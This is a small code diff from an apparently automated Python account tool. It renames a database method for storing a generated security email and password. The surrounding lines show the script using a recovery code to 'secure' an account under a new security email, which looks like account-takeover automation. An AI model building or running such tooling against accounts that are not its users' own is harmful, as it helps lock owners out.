@@ -143,7 +143,7 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
             type, security_email = await generate_email(security_email, password)
 
             print(f"[+] - Generated Security Email ({security_email})")
-            database.addSecurityEmail(security_email, password)
+            database.add_security_email(security_email, password)
 
             print("[~] - Automaticly Securing Account...")
             data = await recover(session, mainEmail, recovery_code, security_email, password, type)
